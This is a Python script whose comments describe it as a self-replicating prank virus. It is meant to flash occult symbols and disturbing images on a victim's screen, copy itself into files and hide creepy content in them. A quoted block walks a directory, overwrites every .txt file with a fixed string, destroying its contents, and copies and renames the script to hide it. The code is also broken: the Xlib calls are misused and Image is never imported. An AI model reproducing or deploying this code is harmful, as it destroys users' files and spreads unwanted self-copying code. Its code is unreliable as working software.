# the purpose of the program is :
    # 1. at runtime, starts to display more and more occult symbols as time goes by, 
        # which disappear almost immediately after their appearance.
    # 2. replicates itself in files: with each infected file (thus with each replication), a horrific image is displayed, 
        # then disappears almost immediately. 
        # So as time goes by, more and more horrific images will be displayed, faster and more often.
    # 3. modifies infected files to hide occult symbols, horrific images, and creepy sentences.



import os
import shutil
import random
import time
import tkinter as tk
import pyautogui
import Xlib.display

# here is the list of occult symbols to display on user screen
symbols = ['☥', '☦', '☧', '☨', '☩', '☫', '☬', '☼', '☽', '☾', '☿', '♀', '♁', '♂', '♃', '♄', '♅', '♆', '♇', '♈', '♉', '♊', '♋', '♌', '♍', '♎', '♏', '♐', '♑', '♒', '♓', '♙', '♰', '♱']


# display random symbols for the list on the user screen

# Generate a random symbol
symbol = symbols[random.randint(0, len(symbols) - 1)]

# Get the default display and root window
display = Xlib.display.Display()
root = display.screen().root

# Create a new font for the symbol
font = display.open_font("fixed")

# Calculate the size of the symbol
font_info = font.query()
width = font_info.char_width * len(symbol)
height = font_info.max_bounds.ascent + font_info.max_bounds.descent

# Create a new graphics context and set the font and color
gc = root.create_gc(foreground=0xFFFFFF, background=0x000000, font=font)

# Draw the symbol at a random position on the screen
x = random.randint(0, display.screen().width_in_pixels - width)
y = random.randint(0, display.screen().height_in_pixels - height)
gc.draw_text(root, gc, x, y + font_info.max_bounds.ascent, symbol)

# Free the font and graphics context
font.close()
gc.free()

# Flush the X server to update the display
display.flush()

"""


# Navigate to the target directory
os.chdir('/path/to/target/directory')

# Modify files and create a copy of the script
for root, dirs, files in os.walk('.'):
    for file in files:
        if file.endswith('.txt'):
            with open(os.path.join(root, file), 'w') as f:
                f.write('This file has been modified by the script')
        elif file == 'script.py':
            shutil.copy('script.py', os.path.join(root, 'copy_of_script.py'))

# Create and display a random image
image = Image.new('RGB', (500, 500))
image.show()

# Hide the script in user files
with open('hidden_file.txt', 'w') as f:
    f.write('This file contains occult symbols and images')
os.rename('script.py', 'hidden_file.jpg')

"""